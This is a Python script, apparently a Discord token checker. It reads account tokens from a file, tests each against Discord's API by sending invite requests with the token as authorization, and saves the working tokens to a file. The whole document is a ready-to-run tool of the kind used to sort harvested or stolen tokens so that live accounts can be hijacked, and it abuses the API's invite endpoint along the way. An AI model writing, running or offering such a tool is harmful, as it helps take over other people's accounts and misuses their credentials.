from requests import get, post
from random import randint
from colorama import Fore, Style, init
import shutil

# coloramaを初期化
init()

# バナーを中央に表示する関数
def print_banner(banner):
    # 現在のターミナルのサイズを取得
    columns, rows = shutil.get_terminal_size()
    for line in banner.split('\n'):
        # バナーの各行を中央に配置
        print(line.center(columns))

# バナーのテキスト
banner_text = """
 ██████╗ █████╗ ████████╗    ████████╗ ██████╗  ██████╗ ██╗     
██╔════╝██╔══██╗╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██║     ███████║   ██║          ██║   ██║   ██║██║   ██║██║     
██║     ██╔══██║   ██║          ██║   ██║   ██║██║   ██║██║     
╚██████╗██║  ██║   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗
 ╚═════╝╚═╝  ╚═╝   ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
"""

# バナーを緑色で表示
print(Fore.GREEN + Style.BRIGHT)
print_banner(banner_text)
print(Style.RESET_ALL)

def variant1(token):
    response = get('https://discord.com/api/v6/auth/login', headers={"Authorization": token})#Bad variant for mass token check due to the rate limit.
    return True if response.status_code == 200 else False

def variant2(token):
    response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
        return False
    else:
        return True

def variant2_Status(token):
    response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if response.status_code == 401:
        return 'Invalid'
    elif "You need to verify your account in order to perform this action." in str(response.content):
        return 'Phone Lock'
    else:
        return 'Valid'

if __name__ == "__main__":
    try:
        checked = []
        with open('tokens.txt', 'r') as tokens:
            for token in tokens.read().split('\n'):
                if len(token) > 15 and token not in checked and variant2(token) == True:
                    print(f'{Fore.GREEN}[+]{Style.RESET_ALL} Token: {token} is Valid')
                    checked.append(token)
                else:
                    print(f'{Fore.RED}[-]{Style.RESET_ALL} Token: {token} is Invalid')
        if len(checked) > 0:
            save = input(f'{len(checked)} valid tokens\nSave valid tokens. (y/n)').lower()
            if save == 'y':
                name = randint(100000000, 9999999999)
                with open(f'{name}.txt', 'w') as saveFile:
                    saveFile.write('\n'.join(checked))
                print(f'Tokens Save To {name}.txt File!')
        input('Press Enter For Exit...')
    except:
        input('Can`t Open "tokens.txt" File!')